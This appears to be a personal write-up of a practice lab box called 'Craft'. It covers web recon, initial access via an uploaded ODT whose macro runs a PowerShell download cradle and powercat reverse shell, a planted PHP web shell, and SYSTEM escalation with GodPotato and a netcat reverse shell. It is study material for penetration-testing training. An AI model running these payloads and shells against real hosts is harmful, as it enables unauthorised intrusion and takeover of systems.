## Initial Foothold

Autorecon 192.168.207.169
```
PORT   STATE SERVICE REASON          VERSION
80/tcp open  http    syn-ack ttl 125 Apache httpd 2.4.48 ((Win64) OpenSSL/1.1.1k PHP/8.0.7)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Craft
|_http-server-header: Apache/2.4.48 (Win64) OpenSSL/1.1.1k PHP/8.0.7
|_http-favicon: Unknown favicon MD5: 556F31ACD686989B1AFCF382C05846AA
```
Ports
- 80 (web) - Tried to dig into the directories or fuzz hidden files but found nothing.
```
feroxbuster -u http://192.168.207.169 -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-directories.txt -x "txt,html,php,jsp,asp,aspx,zip,odt" -k
feroxbuster -u http://192.168.207.169 -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-files.txt -x "txt,html,php,jsp,asp,aspx,zip,odt" -k

ffuf -u 'http://192.168.207.169/#FUZZ' -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt -fs 9635 
ffuf -u 'http://192.168.207.169/index.php?=FUZZ' -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt -fs 9635
```
Tried the file upload feature. It rejected php files so I uploaded `php-reverse-shell.ojt`. It did not appear in the `/uploads/` directory.


Cheated. It's not something I have encountered before. Its uploading an ODT file with a macro.
```
└─$ sudo apt update
sudo apt install libreoffice

##In LibreOffice Writer
Create a new file. Under Tools -> Macros -> Organise Macros -> Basic Macros -> Select your document and click New.

Add this line in the middle:
Shell("cmd /c powershell IEX (New-Object System.Net.Webclient).DownloadString('http://192.168.45.212/powercat.ps1');powercat -c 192.168.45.212 -p 135 -e powershell")

Save and close. Tool -> Customize -> Open Document -> Assign Macro we just created -> Click ok

File -> Save as 
```
After we have the file, we want to host port 80 with `powercat.ps1`. Start a penelope listening port at port 135, upload the file and catch the reverse shell.

## Privesc

PS C:\Users\thecybergeek\desktop> whoami /all
whoami /all

USER INFORMATION
----------------

User Name          SID                                         
================== ============================================
craft\thecybergeek S-1-5-21-537427935-490066102-1511301751-1001


GROUP INFORMATION
-----------------

Run whoami /all
```
Group Name                           Type             SID          Attributes                                        
==================================== ================ ============ ==================================================
Everyone                             Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                        Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\SERVICE                 Well-known group S-1-5-6      Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                        Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users     Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization       Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account           Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
LOCAL                                Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication     Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level Label            S-1-16-12288                                                   


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State   
============================= ============================== ========
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled 
SeCreateGlobalPrivilege       Create global objects          Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```

```
iwr http://192.168.45.212/winPEASany.exe -outfile winPEASany.exe
```

This is again suggesting to me that we should attempt a lateral escalation to the apache user since they are currently logged in. They likely have service level permissions (i.e. SeImpersonatePrivilege).
```
Logged users (T1033)
    CRAFT\thecybergeek
    CRAFT\apache
```

Find out that the webserver is hosted on `/xampp/htdocs`. Go to our linux to make a cmd.php file to upload to that directory.
```
## In kali session 
<pre>
<?php
system($_GET['cmd']);
?>
</pre>

## In windows session
iwr http://192.168.45.212/cmd.php -outfile cmd.php
```

```
http://192.168.207.169/cmd.php?cmd=whoami
craft\apache
```

Tried to upload pentestmonkey php reverse shell but it didn't work. Uploaded Ivan Sincek from `revshells.com` and it worked.

```
whoami
craft\apache

C:\xampp\htdocs>whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeTcbPrivilege                Act as part of the operating system       Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

SeImpersonatePrivilege is enabled. Version 4 of GodPotato.
```
C:\xampp\htdocs>reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP"
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP\CDF
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP\v4
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP\v4.0
```

```
certutil -urlcache -f http://192.168.45.212/GodPotato-NET4.exe Godpotato.exe
certutil -urlcache -f http://192.168.45.212/nc.exe nc.exe
```

Last command.
```
Godpotato.exe -cmd "cmd /c C:\Users\apache\Desktop\nc.exe 192.168.45.212 443 -e cmd.exe"
```

Caught the flag on another penelope listener at port 443.
whoami does not work but we can still locate the flag.